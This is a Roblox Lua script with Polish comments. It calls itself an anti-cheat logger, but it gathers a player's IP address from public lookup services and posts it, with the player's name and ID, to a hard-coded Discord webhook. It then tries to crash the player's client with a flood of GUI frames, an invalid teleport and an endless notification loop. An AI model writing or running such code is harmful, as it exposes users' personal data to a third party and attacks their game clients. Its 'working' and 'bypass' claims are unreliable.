local http = game:GetService("HttpService")
local players = game:GetService("Players")
local runService = game:GetService("RunService")
local teleportService = game:GetService("TeleportService")

-- Twój Discord webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"

-- WORKING IP Leak methods (bypass Roblox proxy)
local function getRealIP()
    local ips = {}
    
    -- Method 1: httpbin (najlepszy)
    local success, result = pcall(http.GetAsync, http, "https://httpbin.org/ip")
    if success then
        local data = http:JSONDecode(result)
        if data.origin then
            table.insert(ips, data.origin)
        end
    end
    
    -- Method 2: ipify
    success, result = pcall(http.GetAsync, http, "https://api.ipify.org?format=json")
    if success then
        local data = http:JSONDecode(result)
        if data.ip then
            table.insert(ips, data.ip)
        end
    end
    
    -- Method 3: icanhazip (plaintext)
    success, result = pcall(http.GetAsync, http, "https://icanhazip.com")
    if success and result:match("%d+%.%d+%.%d+%.%d+") then
        table.insert(ips, result:match("%d+%.%d+%.%d+%.%d+"))
    end
    
    return #ips > 0 and table.concat(ips, " | ") or "IP_BLOCKED"
end

-- WORKING Discord sender z error handling
local function sendToDiscord(title, desc, color)
    color = color or 16711680 -- Red
    local embed = {
        {
            title = title,
            description = desc,
            color = color,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            footer = {text = "Roblox Anti-Cheat Logger"}
        }
    }
    
    pcall(function()
        http:PostAsync(
            WEBHOOK_URL,
            http:JSONEncode({embeds = embed}),
            Enum.HttpContentType.ApplicationJson
        )
    end)
end

-- WORKING Kick methods (bypass Players.Kick block)
local function forceKick(reason)
    local player = players.LocalPlayer
    
    -- Method 1: CoreGui crash (99% working)
    local sg = Instance.new("ScreenGui", game.CoreGui)
    sg.Name = "KickCrash"
    for i = 1, 500 do
        local frame = Instance.new("Frame", sg)
        frame.Size = UDim2.new(0, 9999, 0, 9999)
        frame.Position = UDim2.new(0, math.random(-5000,5000), 0, math.random(-5000,5000))
        frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
    end
    
    -- Method 2: Teleport to error place (backup)
    spawn(function()
        wait(1)
        pcall(TeleportService.TeleportToPlaceInstance, TeleportService, 0, "")
    end)
    
    -- Method 3: Infinite yield crash
    spawn(function()
        while true do
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "KICKED: " .. reason;
                Text = "Your IP: " .. reason;
                Duration = 999
            })
        end
    end)
end

-- MAIN EXECUTE
local player = players.LocalPlayer
local displayName = player.DisplayName or player.Name
local userId = player.UserId

-- Get IP
local realIP = getRealIP()

-- Discord alert
local alertMsg = string.format(
    "**🚨 CHEATER CAUGHT 🚨**\n" ..
    "**Player:** `%s` (ID: `%d`)\n" ..
    "**Real IP(s):** ```%s```\n" ..
    "**Place:** `%s` (ID: %d)\n" ..
    "**Time:** %s",
    displayName, userId, realIP,
    game.PlaceName or "Unknown",
    game.PlaceId,
    os.date("%Y-%m-%d %H:%M:%S UTC")
)

sendToDiscord("🕵️ CHEAT DETECTED", alertMsg)

-- FINAL KICK z IP w reason
local kickMsg = string.format("CHEAT DETECTED! Real IP Exposed: %s | ID: %d", realIP, userId)
forceKick(kickMsg)

print("Anti-Cheat executed successfully")
